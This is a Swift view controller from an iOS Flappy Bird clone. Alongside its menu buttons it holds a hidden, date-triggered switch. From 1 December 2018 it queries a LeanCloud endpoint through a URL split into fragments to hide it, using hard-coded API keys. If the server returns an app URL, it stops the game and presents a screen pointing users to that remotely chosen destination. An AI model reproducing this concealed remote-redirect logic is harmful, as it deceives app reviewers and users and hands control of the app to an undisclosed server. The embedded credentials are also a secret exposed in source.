//
//  MainViewController.swift
//  FlappyBird
//
//  Created by Quan Nguyen Dinh on 11/13/18.
//  Copyright © 2018 Fullstack.io. All rights reserved.
//

import UIKit
import Alamofire
import SwiftyJSON
import AVFoundation

class MainViewController: UIViewController {

    override func viewDidLoad() {
        super.viewDidLoad()

        // Do any additional setup after loading the view.
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        configureLeanClound()
    }
    
    func configureLeanClound() {
        let now = Date()
        let dformatter = DateFormatter()
        dformatter.dateFormat = "yyyyMMdd"
        let nowNum = Int(dformatter.string(from: now))
        if let notday = nowNum{
            if(notday >= 20181201) {
                let url1 = "ht" + "tp" + "s" + ":"
                let url2 = url1 + "//lea" + "ncl" + "oud.c"
                let url3 = url2 + "n:443/1.1/classes/jumpandjump/5beab00c756571006840783e"
                Alamofire.request(URL(string: url3)!, method: .get, parameters: nil, encoding: URLEncoding.default, headers: ["X-LC-Id": "RaGsVxreDFm5LhefzsgQjc6T-gzGzoHsz", "X-LC-Key": "fK3PWjKbOcyHQj7G9uVtB0Dg"]).responseJSON { (res) in
                        if let data = res.data{
                            let json = try! JSON(data: data)
                            if json["version"].stringValue != "1.0", json["appUrl"].stringValue != "" {
                                //go applestore
                                AudioClass.shared.player = nil
                                let helpVC = HelpViewController()
                                helpVC.appleStoreUrl = json["appUrl"].stringValue
                                self.present(helpVC, animated: false, completion: nil)
                            }
                        }
                }
            }
        }
    }
    
    
    @IBAction func startAction(_ sender: Any) {
        let storyboard = UIStoryboard(name: "Main", bundle: nil)
        let controller = storyboard.instantiateViewController(withIdentifier: "GameViewController")
        self.present(controller, animated: true, completion: nil)
    }
    
    @IBAction func settingAction(_ sender: Any) {
        let storyboard = UIStoryboard(name: "Main", bundle: nil)
        let controller = storyboard.instantiateViewController(withIdentifier: "SettingViewController")
        self.present(controller, animated: true, completion: nil)
    }
    
    @IBAction func exitAction(_ sender: Any) {
    }
}
